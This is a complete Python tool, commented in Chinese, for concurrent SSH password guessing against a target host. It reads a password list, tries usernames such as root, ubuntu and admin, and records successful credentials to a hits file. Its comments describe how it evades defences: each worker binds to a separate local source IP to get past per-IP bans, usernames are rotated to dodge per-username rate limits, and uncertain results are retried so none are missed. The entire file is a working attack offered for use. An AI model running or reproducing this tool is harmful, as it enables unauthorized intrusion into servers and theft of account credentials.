#!/usr/bin/env python3
"""多源 IP 并发 SSH 口令验证（区分「明确失败」与「不确定」+ 不确定补测）。

用法:
  # 主跑
  python3 ssh_multi_source_ip.py --host 1.2.3.4 --port 2026 \
      --users root,ubuntu,admin --pwfile /tmp/pw.txt \
      --ips 45.192.102.149,<IP-REDACTED> --conc-per-ip 6 --per-min 0 \
      --hit /tmp/ssh_hit.txt --unknown /tmp/ssh_unknown.txt
  # 补测全部不确定结果（同一轮结束后必跑）
  python3 ssh_multi_source_ip.py --host 1.2.3.4 --port 2026 --users x \
      --ips 45.192.102.149,<IP-REDACTED> --repass /tmp/ssh_unknown.txt \
      --pwfile /dev/null

要点:
- 每个 worker 绑定一个本地源 IP（socket.bind），把「按源 IP 封」变成 N 份独立配额。
- AuthenticationException = 明确失败；连接被丢/超时/banner 错 = 不确定，绝不算失败。
- 不确定结果落盘，主循环结束后整轮补测，避免假阴性。
"""
import argparse
import queue
import socket
import sys
import threading
import time

import paramiko


# 口令优先序：同一口令先打所有用户名，口令按文件顺序（最看好的放文件头部）
# 多用户名轮换 = 绕「按用户名桶」限流。

def classify(host, port, src_ip, user, pw, timeout):
    """返回 ok / fail / unknown。unknown 绝不等于 fail。"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind((src_ip, 0))
        sock.settimeout(timeout)
        sock.connect((host, port))
    except Exception:
        try:
            sock.close()
        except Exception:
            pass
        return "unknown"
    tr = paramiko.Transport(sock)
    try:
        tr.start_client(timeout=timeout)
        tr.auth_password(user, pw)
        return "ok"
    except paramiko.AuthenticationException:
        return "fail"
    except paramiko.BadAuthenticationType:
        return "fail"
    except Exception:
        return "unknown"
    finally:
        try:
            tr.close()
        except Exception:
            pass


def run(args, tasks):
    total = tasks.qsize()
    lock = threading.Lock()
    state = {"n": 0, "fail": 0, "unknown": 0}
    t0 = time.time()
    hit_fh = open(args.hit, "a", buffering=1)
    unk_fh = open(args.unknown, "a", buffering=1)

    def worker(src_ip):
        interval = 60.0 / args.per_min if args.per_min else 0.0
        while True:
            try:
                user, pw = tasks.get_nowait()
            except queue.Empty:
                return
            res = "unknown"
            for _ in range(args.retries):
                res = classify(args.host, args.port, src_ip, user, pw, args.timeout)
                if res != "unknown":
                    break
                time.sleep(1.0)
            with lock:
                state["n"] += 1
                if res == "fail":
                    state["fail"] += 1
                elif res == "unknown":
                    state["unknown"] += 1
                    unk_fh.write("%s:%s\n" % (user, pw))
                else:
                    print("!!! HIT %s:%s  (src=%s)" % (user, pw, src_ip), flush=True)
                    hit_fh.write("%s:%s\n" % (user, pw))
                if state["n"] % 100 == 0:
                    el = max(time.time() - t0, 0.001)
                    print("[%d/%d] %.0f 次/分  明确失败=%d  不确定=%d  用时=%.1fmin"
                          % (state["n"], total, state["n"] / el * 60,
                             state["fail"], state["unknown"], el / 60), flush=True)
            if interval:
                time.sleep(interval)

    threads = []
    for src_ip in args.ips:
        for _ in range(args.conc_per_ip):
            t = threading.Thread(target=worker, args=(src_ip,), daemon=True)
            threads.append(t)
    print("启动: %d 任务 / %d 源IP x %d 并发" % (total, len(args.ips), args.conc_per_ip), flush=True)
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print("完成: 总=%d 明确失败=%d 不确定=%d（补测请用 --repass %s）"
          % (state["n"], state["fail"], state["unknown"], args.unknown), flush=True)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=22)
    ap.add_argument("--users", required=True, help="逗号分隔")
    ap.add_argument("--pwfile", default="/dev/null")
    ap.add_argument("--ips", required=True, help="逗号分隔的本地源 IP")
    ap.add_argument("--conc-per-ip", type=int, default=6)
    ap.add_argument("--per-min", type=float, default=0.0, help="每源 IP 每分尝试数，0=不限")
    ap.add_argument("--timeout", type=float, default=12.0)
    ap.add_argument("--retries", type=int, default=3)
    ap.add_argument("--hit", default="/tmp/ssh_hit.txt")
    ap.add_argument("--unknown", default="/tmp/ssh_unknown.txt")
    ap.add_argument("--repass", help="补测文件（user:pw 每行），给定时忽略 --pwfile 内容")
    args = ap.parse_args()
    args.ips = [x.strip() for x in args.ips.split(",") if x.strip()]
    users = [x.strip() for x in args.users.split(",") if x.strip()]

    tasks = queue.Queue()
    if args.repass:
        with open(args.repass, encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                line = line.strip()
                if line and ":" in line:
                    u, p = line.split(":", 1)
                    tasks.put((u, p))
    else:
        with open(args.pwfile, encoding="utf-8", errors="ignore") as fh:
            pws = [l.rstrip("\n").strip() for l in fh if l.strip()]
        for pw in pws:
            for u in users:
                tasks.put((u, pw))
    run(args, tasks)


if __name__ == "__main__":
    sys.exit(main())
